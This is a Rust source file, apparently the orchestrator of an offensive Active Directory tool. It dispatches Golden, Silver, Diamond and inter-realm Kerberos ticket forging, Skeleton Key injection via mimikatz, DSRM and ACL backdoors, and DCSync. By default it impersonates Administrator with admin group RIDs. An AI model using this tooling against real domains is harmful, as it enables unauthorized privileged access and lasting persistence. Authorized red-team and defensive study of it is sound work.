//! Top-level orchestrator for the forge pipeline.
//! Takes a ForgeConfig and dispatches to the appropriate forging module.

use colored::Colorize;
use overthrone_core::error::Result;
use serde::{Deserialize, Serialize};

use crate::{acl_backdoor, dcsync_user, diamond, dsrm, golden, silver, skeleton};

/// What kind of ticket/persistence to forge
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ForgeAction {
    GoldenTicket,
    SilverTicket { target_spn: String },
    DiamondTicket,
    InterRealmTgt { target_domain: String },
    SkeletonKey,
    DsrmBackdoor,
    DcSyncUser { target_user: String },
    AclBackdoor { target_dn: String, trustee: String },
}

impl std::fmt::Display for ForgeAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GoldenTicket => write!(f, "Golden Ticket"),
            Self::SilverTicket { target_spn } => write!(f, "Silver Ticket ({})", target_spn),
            Self::DiamondTicket => write!(f, "Diamond Ticket"),
            Self::InterRealmTgt { target_domain } => {
                write!(f, "Inter-Realm TGT → {}", target_domain)
            }
            Self::SkeletonKey => write!(f, "Skeleton Key"),
            Self::DsrmBackdoor => write!(f, "DSRM Backdoor"),
            Self::DcSyncUser { target_user } => write!(f, "DCSync ({})", target_user),
            Self::AclBackdoor { target_dn, trustee } => {
                write!(f, "ACL Backdoor ({} → {})", trustee, target_dn)
            }
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ForgeConfig {
    pub dc_ip: String,
    pub domain: String,
    pub username: String,
    pub password: Option<String>,
    pub nt_hash: Option<String>,
    pub action: ForgeAction,
    /// krbtgt hash (RC4/AES) — required for Golden/Diamond
    pub krbtgt_hash: Option<String>,
    /// krbtgt AES256 key — preferred for Diamond tickets
    pub krbtgt_aes256: Option<String>,
    /// Service account hash — required for Silver tickets
    pub service_hash: Option<String>,
    /// Domain SID (S-1-5-21-...)
    pub domain_sid: Option<String>,
    /// Target user to impersonate in forged ticket
    pub impersonate: Option<String>,
    /// User RID to embed in PAC (default: 500 = Administrator)
    pub user_rid: u32,
    /// Group RIDs for PAC (default: DA, EA, Schema Admins, etc.)
    pub group_rids: Vec<u32>,
    /// Extra SIDs to inject (for inter-realm / SID history)
    pub extra_sids: Vec<String>,
    /// Ticket lifetime in hours
    pub lifetime_hours: u32,
    /// Output path for .kirbi / .ccache file
    pub output_path: Option<String>,
    /// Path to local payload binary (e.g. mimikatz.exe for skeleton key)
    pub payload_path: Option<String>,
}

impl ForgeConfig {
    pub fn effective_impersonate(&self) -> &str {
        self.impersonate.as_deref().unwrap_or("Administrator")
    }

    pub fn effective_groups(&self) -> Vec<u32> {
        if self.group_rids.is_empty() {
            // Default: Domain Admins(512), Domain Users(513), Schema Admins(518),
            // Enterprise Admins(519), Group Policy Creator(520)
            vec![512, 513, 518, 519, 520]
        } else {
            self.group_rids.clone()
        }
    }

    pub fn effective_lifetime(&self) -> u32 {
        if self.lifetime_hours == 0 {
            10
        } else {
            self.lifetime_hours
        }
    }
}

/// Result of a forge operation
#[derive(Debug, Clone, Serialize)]
pub struct ForgeResult {
    pub action: String,
    pub domain: String,
    pub success: bool,
    pub ticket_data: Option<ForgedTicket>,
    pub persistence_result: Option<PersistenceResult>,
    pub message: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ForgedTicket {
    pub ticket_type: String,
    pub impersonated_user: String,
    pub domain: String,
    pub spn: String,
    pub encryption_type: String,
    pub valid_from: String,
    pub valid_until: String,
    pub group_rids: Vec<u32>,
    pub extra_sids: Vec<String>,
    pub kirbi_path: Option<String>,
    pub ccache_path: Option<String>,
    pub kirbi_base64: Option<String>,
    pub ticket_size_bytes: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct PersistenceResult {
    pub mechanism: String,
    pub target: String,
    pub success: bool,
    pub details: String,
    pub cleanup_command: Option<String>,
}

/// Run the forge pipeline.
pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
    let sep = "═══════════════════════════════════════════════";

    println!("\n{}", sep.bright_magenta());
    println!(
        "{} {} ({})",
        "🔨 FORGE".bright_magenta().bold(),
        config.action.to_string().as_str().bright_white().bold(),
        config.domain.as_str().dimmed()
    );
    println!("{}\n", sep.bright_magenta());

    let result = match &config.action {
        ForgeAction::GoldenTicket => golden::forge_golden_ticket(config).await?,
        ForgeAction::SilverTicket { target_spn } => {
            silver::forge_silver_ticket(config, target_spn).await?
        }
        ForgeAction::DiamondTicket => diamond::forge_diamond_ticket(config).await?,
        ForgeAction::InterRealmTgt { target_domain } => {
            golden::forge_interrealm_tgt(config, target_domain).await?
        }
        ForgeAction::SkeletonKey => skeleton::inject_skeleton_key(config).await?,
        ForgeAction::DsrmBackdoor => dsrm::enable_dsrm_backdoor(config).await?,
        ForgeAction::DcSyncUser { target_user } => {
            dcsync_user::dcsync_single_user(config, target_user).await?
        }
        ForgeAction::AclBackdoor { target_dn, trustee } => {
            acl_backdoor::install_acl_backdoor(config, target_dn, trustee).await?
        }
    };

    // Summary
    let status = if result.success {
        "✓ SUCCESS".green().bold()
    } else {
        "✗ FAILED".red().bold()
    };
    println!("\n{} {}", status, result.message.as_str().bright_white());

    if let Some(ref ticket) = result.ticket_data {
        println!(
            "  {} {} as {}",
            "Ticket:".dimmed(),
            ticket.ticket_type.as_str().bright_cyan(),
            ticket.impersonated_user.as_str().bright_yellow()
        );
        println!(
            "  {} {} → {}",
            "Valid:".dimmed(),
            ticket.valid_from.as_str().bright_green(),
            ticket.valid_until.as_str().bright_green()
        );
        if let Some(ref path) = ticket.kirbi_path {
            println!("  {} {}", "Saved:".dimmed(), path.as_str().bright_white());
        }
    }

    Ok(result)
}
